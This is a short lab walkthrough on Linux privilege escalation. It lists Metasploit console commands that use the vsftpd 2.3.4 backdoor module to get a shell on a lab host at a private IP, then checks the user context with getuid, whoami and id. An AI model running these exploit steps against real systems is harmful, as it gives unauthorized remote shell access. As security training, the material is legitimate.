# Lab 2.1 — Linux Privilege Escalation

## 🎯 Objective

Demonstrate how an obtained shell can be examined to determine the current user and privilege context on an intentionally vulnerable Linux system.

---

## Step 1 — Start Metasploit

```bash
msfconsole
```

---

## Step 2 — Search for the Laboratory Vulnerability

```text
search vsftpd 2.3.4
```

---

## Step 3 — Select the Module

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

## Step 4 — Configure the Laboratory Target

```text
set RHOSTS 192.168.153.131
```

Set the Kali address where required:

```text
set LHOST 192.168.153.130
```

Verify:

```text
show options
```

---

## Step 5 — Execute Against the Lab Target

```text
run
```

---

## Step 6 — Identify the Metasploit User Context

```text
getuid
```

This identifies the security context associated with the session.

---

## Step 7 — Open a Shell

```text
shell
```

---

## Step 8 — Identify the Current Linux User

```bash
whoami
```

---

## Step 9 — Examine User and Group Information

```bash
id
```

This displays the UID, GID, and group memberships.

---

## 🧠 What You Learned

Privilege escalation begins with understanding the current security context.

A typical assessment workflow is:

```text
Initial Access
      ↓
Obtain Shell
      ↓
whoami
      ↓
id
      ↓
Enumerate Privileges
      ↓
Identify Escalation Opportunities
```

This lab focuses on the identification stage in the intentionally vulnerable environment.
